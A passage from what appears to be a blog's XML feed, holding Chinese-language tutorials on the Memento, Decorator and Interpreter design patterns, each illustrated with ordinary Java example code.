  </entry>
  <entry>
    <title>设计模式-备忘录模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>备忘录模式（Memento Pattern）保存一个对象的某个状态，以便在适当的时候恢复对象。在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-memento1.png" alt="备忘录模式类图"></p>
<h3 id="Originator（生成者）"><a href="#Originator（生成者）" class="headerlink" title="Originator（生成者）"></a>Originator（生成者）</h3><p>会在保存自己的最新状态时生成Memento角色。当把以前保存的Memento角色传递给Originator角色时，它会将自己恢复至生产该Memento角色时的状态。</p>
<h3 id="Memento（纪念品、备忘录）"><a href="#Memento（纪念品、备忘录）" class="headerlink" title="Memento（纪念品、备忘录）"></a>Memento（纪念品、备忘录）</h3><p>会将Originator角色的内部信息整合在一起。在Memento角色中虽然保存了Originator角色的信息，但它不会像外部公开这些信息。</p>
<p>Memento有以下两种接口（API）</p>
<ul>
<li>wide interface-宽接口</li>
</ul>
<p>Memento提供的“宽接口”是指所有用于获取恢复对象状态信息的方法的集合。由于宽接口会暴露所有Memento的内部信息，因此能够使用款接口的只有Originator角色</p>
<ul>
<li>narrow interface-窄接口</li>
</ul>
<p>Memento为外部的CareTaker提供了“窄接口”。可以通过窄接口获取的Memento的内部信息非常有限，因此可以有效地防止信息泄露</p>
<h3 id="CareTaker"><a href="#CareTaker" class="headerlink" title="CareTaker"></a>CareTaker</h3><p>当CareTaker想要保存当前的Originator的状态时，会通知Originator。Originator在接收到通知后会生成Memento的实例并将其返回给CareTake。由于后面可能会用Memento实例来将Originator恢复至原来的状态，因此CareTaker会一直保存Memento实例。</p>
<p>不过CareTaker只能使用Memento两种接口的窄接口，也就是说它无法访问Memento内部的所有信息。<strong>它只是将Originator生成的Memento当做一个黑盒子保存起来</strong>。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-memento2.png" alt="备忘录模式示例类图"></p>
<h3 id="Gamer"><a href="#Gamer" class="headerlink" title="Gamer"></a>Gamer</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gamer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> money;                          </span><br><span class="line">    <span class="keyword">private</span> List fruits = <span class="keyword">new</span> ArrayList();     </span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();       </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] fruitsname = &#123;      </span><br><span class="line">        <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Gamer</span><span class="params">(<span class="keyword">int</span> money)</span> </span>&#123;                   </span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMoney</span><span class="params">()</span> </span>&#123;                     </span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bet</span><span class="params">()</span> </span>&#123;                         </span><br><span class="line">        <span class="keyword">int</span> dice = random.nextInt(<span class="number">6</span>) + <span class="number">1</span>;           </span><br><span class="line">        <span class="keyword">if</span> (dice == <span class="number">1</span>) &#123;                            </span><br><span class="line">            money += <span class="number">100</span>;</span><br><span class="line">            System.out.println(<span class="string">"7"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dice == <span class="number">2</span>) &#123;                     </span><br><span class="line">            money /= <span class="number">2</span>;</span><br><span class="line">            System.out.println(<span class="string">"6"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dice == <span class="number">6</span>) &#123;                     </span><br><span class="line">            String f = getFruit();</span><br><span class="line">            System.out.println(<span class="string">"4"</span> + f + <span class="string">"5"</span>);</span><br><span class="line">            fruits.add(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;                                    </span><br><span class="line">            System.out.println(<span class="string">"3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Memento <span class="title">createMemento</span><span class="params">()</span> </span>&#123;                </span><br><span class="line">        Memento m = <span class="keyword">new</span> Memento(money);</span><br><span class="line">        Iterator it = fruits.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            String f = (String)it.next();</span><br><span class="line">            <span class="keyword">if</span> (f.startsWith(<span class="string">"2"</span>)) &#123;         </span><br><span class="line">                m.addFruit(f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">restoreMemento</span><span class="params">(Memento memento)</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">this</span>.money = memento.money;</span><br><span class="line">        <span class="keyword">this</span>.fruits = memento.getFruits();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;                      </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[money = "</span> + money + <span class="string">", fruits = "</span> + fruits + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getFruit</span><span class="params">()</span> </span>&#123;                     </span><br><span class="line">        String prefix = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (random.nextBoolean()) &#123;</span><br><span class="line">            prefix = <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prefix + fruitsname[random.nextInt(fruitsname.length)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Memento"><a href="#Memento" class="headerlink" title="Memento"></a>Memento</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Memento</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> money;                              </span><br><span class="line">    ArrayList fruits;                       </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMoney</span><span class="params">()</span> </span>&#123;                 </span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line">    Memento(<span class="keyword">int</span> money) &#123;                    </span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">        <span class="keyword">this</span>.fruits = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addFruit</span><span class="params">(String fruit)</span> </span>&#123;           </span><br><span class="line">        fruits.add(fruit);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">List <span class="title">getFruits</span><span class="params">()</span> </span>&#123;                      </span><br><span class="line">         <span class="keyword">return</span> (List)fruits.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Gamer gamer &#x3D; new Gamer(100);               </span><br><span class="line">        Memento memento &#x3D; gamer.createMemento();    </span><br><span class="line">        for (int i &#x3D; 0; i &lt; 100; i++) &#123;</span><br><span class="line">            System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D; &quot; + i);        </span><br><span class="line">            System.out.println(&quot;0&quot; + gamer);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;1&quot; + gamer.getMoney() + &quot;2&quot;);</span><br><span class="line"></span><br><span class="line">            if (gamer.getMoney() &gt; memento.getMoney()) &#123;</span><br><span class="line">                System.out.println(&quot;3&quot;);</span><br><span class="line">                memento &#x3D; gamer.createMemento();</span><br><span class="line">            &#125; else if (gamer.getMoney() &lt; memento.getMoney() &#x2F; 2) &#123;</span><br><span class="line">                System.out.println(&quot;4&quot;);</span><br><span class="line">                gamer.restoreMemento(memento);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>备忘录模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-装饰器模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。</p>
<p>这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-decorator1.png" alt="装饰器模式类图"></p>
<h3 id="Component"><a href="#Component" class="headerlink" title="Component"></a>Component</h3><p>增加功能时的核心角色</p>
<h3 id="ConcreteComponent"><a href="#ConcreteComponent" class="headerlink" title="ConcreteComponent"></a>ConcreteComponent</h3><p>实现了Component角色所定义的接口</p>
<h3 id="Decorator（装饰物）"><a href="#Decorator（装饰物）" class="headerlink" title="Decorator（装饰物）"></a>Decorator（装饰物）</h3><p>具有和Component相同的接口，在它内部保存了被装饰对象-Component。它知道自己要装饰的对象。</p>
<h3 id="ConcreteDecorator（具体的装饰物）"><a href="#ConcreteDecorator（具体的装饰物）" class="headerlink" title="ConcreteDecorator（具体的装饰物）"></a>ConcreteDecorator（具体的装饰物）</h3><p>具体的Decorator。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-decorator2.png" alt="装饰器模式示例类图"></p>
<h3 id="Border"><a href="#Border" class="headerlink" title="Border"></a>Border</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Border</span> <span class="keyword">extends</span> <span class="title">Display</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Display display;          </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Border</span><span class="params">(Display display)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.display = display;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Display</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">getColumns</span><span class="params">()</span></span>;               </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">getRows</span><span class="params">()</span></span>;                  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getRowText</span><span class="params">(<span class="keyword">int</span> row)</span></span>;     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;                            </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; getRows(); i++) &#123;</span><br><span class="line">            System.out.println(getRowText(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FullBorder"><a href="#FullBorder" class="headerlink" title="FullBorder"></a>FullBorder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FullBorder</span> <span class="keyword">extends</span> <span class="title">Border</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FullBorder</span><span class="params">(Display display)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(display);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getColumns</span><span class="params">()</span> </span>&#123;                   </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + display.getColumns() + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRows</span><span class="params">()</span> </span>&#123;                      </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + display.getRows() + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getRowText</span><span class="params">(<span class="keyword">int</span> row)</span> </span>&#123;         </span><br><span class="line">        <span class="keyword">if</span> (row == <span class="number">0</span>) &#123;                                                 </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"+"</span> + makeLine(<span class="string">'-'</span>, display.getColumns()) + <span class="string">"+"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (row == display.getRows() + <span class="number">1</span>) &#123;                      </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"+"</span> + makeLine(<span class="string">'-'</span>, display.getColumns()) + <span class="string">"+"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;                                                        </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"|"</span> + display.getRowText(row - <span class="number">1</span>) + <span class="string">"|"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeLine</span><span class="params">(<span class="keyword">char</span> ch, <span class="keyword">int</span> count)</span> </span>&#123;         </span><br><span class="line">        StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            buf.append(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SideBorder"><a href="#SideBorder" class="headerlink" title="SideBorder"></a>SideBorder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SideBorder</span> <span class="keyword">extends</span> <span class="title">Border</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> borderChar;                        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SideBorder</span><span class="params">(Display display, <span class="keyword">char</span> ch)</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">super</span>(display);</span><br><span class="line">        <span class="keyword">this</span>.borderChar = ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getColumns</span><span class="params">()</span> </span>&#123;                       </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + display.getColumns() + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRows</span><span class="params">()</span> </span>&#123;                          </span><br><span class="line">        <span class="keyword">return</span> display.getRows();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getRowText</span><span class="params">(<span class="keyword">int</span> row)</span> </span>&#123;             </span><br><span class="line">        <span class="keyword">return</span> borderChar + display.getRowText(row) + borderChar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StringDisplay"><a href="#StringDisplay" class="headerlink" title="StringDisplay"></a>StringDisplay</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDisplay</span> <span class="keyword">extends</span> <span class="title">Display</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String string;                          </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StringDisplay</span><span class="params">(String string)</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">this</span>.string = string;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getColumns</span><span class="params">()</span> </span>&#123;                       </span><br><span class="line">        <span class="keyword">return</span> string.getBytes().length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRows</span><span class="params">()</span> </span>&#123;                          </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getRowText</span><span class="params">(<span class="keyword">int</span> row)</span> </span>&#123;             </span><br><span class="line">        <span class="keyword">if</span> (row == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> string;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Display b1 = <span class="keyword">new</span> StringDisplay(<span class="string">"Hello, world."</span>);</span><br><span class="line">        Display b2 = <span class="keyword">new</span> SideBorder(b1, <span class="string">'#'</span>);</span><br><span class="line">        Display b3 = <span class="keyword">new</span> FullBorder(b2);</span><br><span class="line">        b1.show();</span><br><span class="line">        b2.show();</span><br><span class="line">        b3.show();</span><br><span class="line">        Display b4 = </span><br><span class="line">                    <span class="keyword">new</span> SideBorder(</span><br><span class="line">                        <span class="keyword">new</span> FullBorder(</span><br><span class="line">                            <span class="keyword">new</span> FullBorder(</span><br><span class="line">                                <span class="keyword">new</span> SideBorder(</span><br><span class="line">                                    <span class="keyword">new</span> FullBorder(</span><br><span class="line">                                        <span class="keyword">new</span> StringDisplay(<span class="string">"StringDisplay"</span>)</span><br><span class="line">                                    ),</span><br><span class="line">                                    <span class="string">'*'</span></span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="string">'/'</span></span><br><span class="line">                    );</span><br><span class="line">        b4.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Decorator模式中，装饰边框与被装饰物具有相同的接口。虽然接口是相同的，但是越装饰，功能则越多。此时我们完全不需要对被装饰的类做任何修改。这样就实现了<strong>不修改被装饰的类即可增加功能</strong>。</p>
<p>Decorator模式中使用到了委托，它是类之间形成了弱关联关系。因此，不用改变框架代码，就可以生成一个与其他对象具有不同关系的新对象。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>装饰器模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-解释器模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="解释器模式"><a href="#解释器模式" class="headerlink" title="解释器模式"></a>解释器模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-interpret1.png" alt="解释器模式类图"></p>
<h3 id="AbstractExpression（抽象表达式）"><a href="#AbstractExpression（抽象表达式）" class="headerlink" title="AbstractExpression（抽象表达式）"></a>AbstractExpression（抽象表达式）</h3><p>定义了语法树节点的共同接口。</p>
<h3 id="TerminalExpression（终结符表达式）"><a href="#TerminalExpression（终结符表达式）" class="headerlink" title="TerminalExpression（终结符表达式）"></a>TerminalExpression（终结符表达式）</h3><p>对应BNF中的终结符表达式</p>
<h3 id="NonterminalExpression（非终结符表达式）"><a href="#NonterminalExpression（非终结符表达式）" class="headerlink" title="NonterminalExpression（非终结符表达式）"></a>NonterminalExpression（非终结符表达式）</h3><p>对应BNF中的非终结符表达式</p>
<h3 id="Context（文脉，上下文）"><a href="#Context（文脉，上下文）" class="headerlink" title="Context（文脉，上下文）"></a>Context（文脉，上下文）</h3><p>为解释器语法提供了必要的信息</p>
<h3 id="Client（请求者）"><a href="#Client（请求者）" class="headerlink" title="Client（请求者）"></a>Client（请求者）</h3><p>为了推导语法数，Client会调用TerminalExpression和NonterminalExpression。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-interpret2.png" alt="解释器模式示例类图"></p>
<h3 id="CommandListNode"><a href="#CommandListNode" class="headerlink" title="CommandListNode"></a>CommandListNode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;command list&gt; ::= &lt;command&gt;* end</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandListNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Node&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (context.currentToken() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(<span class="string">"Missing 'end'"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (context.currentToken().equals(<span class="string">"end"</span>)) &#123;</span><br><span class="line">                context.skipToken(<span class="string">"end"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Node commandNode = <span class="keyword">new</span> CommandNode();</span><br><span class="line">                commandNode.parse(context);</span><br><span class="line">                list.add(commandNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommandNode"><a href="#CommandNode" class="headerlink" title="CommandNode"></a>CommandNode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;command&gt; ::= &lt;repeat command&gt; | &lt;primitive command&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node node;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (context.currentToken().equals(<span class="string">"repeat"</span>)) &#123;</span><br><span class="line">            node = <span class="keyword">new</span> RepeatCommandNode();</span><br><span class="line">            node.parse(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = <span class="keyword">new</span> PrimitiveCommandNode();</span><br><span class="line">            node.parse(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> node.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Context &#123;</span><br><span class="line">    private StringTokenizer tokenizer;</span><br><span class="line">    private String currentToken;</span><br><span class="line">    public Context(String text) &#123;</span><br><span class="line">        tokenizer &#x3D; new StringTokenizer(text);</span><br><span class="line">        nextToken();</span><br><span class="line">    &#125;</span><br><span class="line">    public String nextToken() &#123;</span><br><span class="line">        if (tokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            currentToken &#x3D; tokenizer.nextToken();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            currentToken &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">        return currentToken;</span><br><span class="line">    &#125;</span><br><span class="line">    public String currentToken() &#123;</span><br><span class="line">        return currentToken;</span><br><span class="line">    &#125;</span><br><span class="line">    public void skipToken(String token) throws ParseException &#123;</span><br><span class="line">        if (!token.equals(currentToken)) &#123;</span><br><span class="line">            throw new ParseException(&quot;Warning: &quot; + token + &quot; is expected, but &quot; + currentToken + &quot; is found.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        nextToken();</span><br><span class="line">    &#125;</span><br><span class="line">    public int currentNumber() throws ParseException &#123;</span><br><span class="line">        int number &#x3D; 0;</span><br><span class="line">        try &#123;</span><br><span class="line">            number &#x3D; Integer.parseInt(currentToken);</span><br><span class="line">        &#125; catch (NumberFormatException e) &#123;</span><br><span class="line">            throw new ParseException(&quot;Warning: &quot; + e);</span><br><span class="line">        &#125;</span><br><span class="line">        return number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ParseException"><a href="#ParseException" class="headerlink" title="ParseException"></a>ParseException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParseException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ParseException</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

